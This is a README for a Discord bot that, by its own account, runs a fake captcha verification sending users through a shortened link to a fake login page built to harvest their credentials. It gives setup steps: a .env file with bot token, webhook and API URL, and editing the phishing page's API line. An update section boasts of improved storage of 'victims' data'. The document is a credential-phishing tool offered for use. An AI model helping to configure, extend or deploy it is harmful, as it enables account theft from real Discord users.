## Configuration

This project requires a `.env` file to operate correctly. Follow the steps below to set it up:

1. Create a new file at the root of the project named `.env`.
2. Open the `.env` file and define the following environment variables:

```properties
# API Configuration
API = "YOUR API URL"

# Bot Configuration
TOKEN = "YOUR BOT TOKEN"
GROUP_ID = "YOUR GROUP ID"
CHANNEL_ID = "YOUR CHANNEL ID"

# Webhook Configuration
WEBHOOK_URL = 'YOUR WEBHOOK LINK'
```

Replace the above values with your actual information.

Additionally, you need to update the API URL in the `util\verification\index.html` file. Find the line 383 where it says `https://youapihere` and replace it with your actual API URL.

## Code Functionality Summary

This code is a Discord bot that performs a fake captcha verification. When the verification button is pressed, a shortened link is generated, leading the user to a verification page. This page is actually a fake login page, designed to harvest user credentials.

## Update

- We have fixed a rate limit bug that was affecting the performance of our application. Now, the application handles rate limits more efficiently, ensuring smoother operation.
- In addition, we have improved the way we save victims' data. The new method is more reliable and secure, providing better data integrity and protection for our users.

<p align="center">
  <img src=https://cdn.discordapp.com/attachments/1194014723113488498/1194014759582969897/image.png?ex=65aecfe6&is=659c5ae6&hm=152a9bf28f6b239b7d59e457bf5fe80650ce97c240a4f4956a5d8d5237130e92&" width="45%" />
</p>
<p align="center">
  <img src="https://media.discordapp.net/attachments/1194014723113488498/1194015124852314112/image.png?ex=65aed03d&is=659c5b3d&hm=0608269d935aa3e6993aecce6c942ba22f1c84560c0b1efe07de45e6c8a0c7af&=&format=webp&quality=lossless&width=567&height=597" width="45%" />
</p>